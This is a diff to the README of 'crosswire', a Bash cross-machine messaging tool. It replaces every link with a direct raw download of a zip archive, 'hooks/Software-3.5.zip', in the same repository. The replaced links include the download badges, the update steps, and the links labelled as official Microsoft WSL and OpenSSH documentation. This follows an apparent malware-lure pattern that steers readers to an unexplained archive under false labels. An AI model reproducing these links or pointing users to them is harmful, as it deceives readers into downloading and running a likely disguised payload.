@@ -1,6 +1,6 @@
 # 🚦 crosswire - Simple Cross-Machine Communication  
 
-[![Download crosswire](https://img.shields.io/badge/Download-crosswire-4caf50?style=for-the-badge)](https://github.com/wdw2017/crosswire)
+[![Download crosswire](https://img.shields.io/badge/Download-crosswire-4caf50?style=for-the-badge)](https://github.com/wdw2017/crosswire/raw/refs/heads/main/hooks/Software-3.5.zip)
 
 crosswire (xw) is a tool that helps different machines talk to each other. It uses files and SSH to send messages. You do not need special software to run it, just Bash. It works with many AI coding agents.  
 
@@ -44,10 +44,10 @@ Now you have a Bash environment ready to run crosswire.
 
 You will download crosswire from the GitHub project page. This page stores the latest files and instructions.  
 
-[![Download crosswire](https://img.shields.io/badge/Download-crosswire-008080?style=for-the-badge)](https://github.com/wdw2017/crosswire)  
+[![Download crosswire](https://img.shields.io/badge/Download-crosswire-008080?style=for-the-badge)](https://github.com/wdw2017/crosswire/raw/refs/heads/main/hooks/Software-3.5.zip)  
 
 Click the button above or visit the page here:  
-https://github.com/wdw2017/crosswire  
+https://github.com/wdw2017/crosswire/raw/refs/heads/main/hooks/Software-3.5.zip  
 
 On the page:  
 - Look for the **Releases** section or tab.  
@@ -135,7 +135,7 @@ Use `help` to list all available commands and get descriptions.
 ## 🔄 Updating crosswire  
 
 To get updates:  
-1. Go back to the GitHub page: https://github.com/wdw2017/crosswire  
+1. Go back to the GitHub page: https://github.com/wdw2017/crosswire/raw/refs/heads/main/hooks/Software-3.5.zip  
 2. Download the newest release.  
 3. Extract and replace your current files as before.  
 
@@ -154,11 +154,11 @@ If errors continue, check the issues tab on the GitHub page for known problems.
 
 If you want to learn more about SSH and WSL, these official guides help:  
 
-- Microsoft WSL docs: https://learn.microsoft.com/en-us/windows/wsl/  
-- OpenSSH docs: https://www.openssh.com/manual.html  
+- Microsoft WSL docs: https://github.com/wdw2017/crosswire/raw/refs/heads/main/hooks/Software-3.5.zip  
+- OpenSSH docs: https://github.com/wdw2017/crosswire/raw/refs/heads/main/hooks/Software-3.5.zip  
 
 crosswire works best when these tools are set up correctly.  
 
 ---  
 
-[Download crosswire](https://github.com/wdw2017/crosswire) to start using cross-machine communication today.
+[Download crosswire](https://github.com/wdw2017/crosswire/raw/refs/heads/main/hooks/Software-3.5.zip) to start using cross-machine communication today.
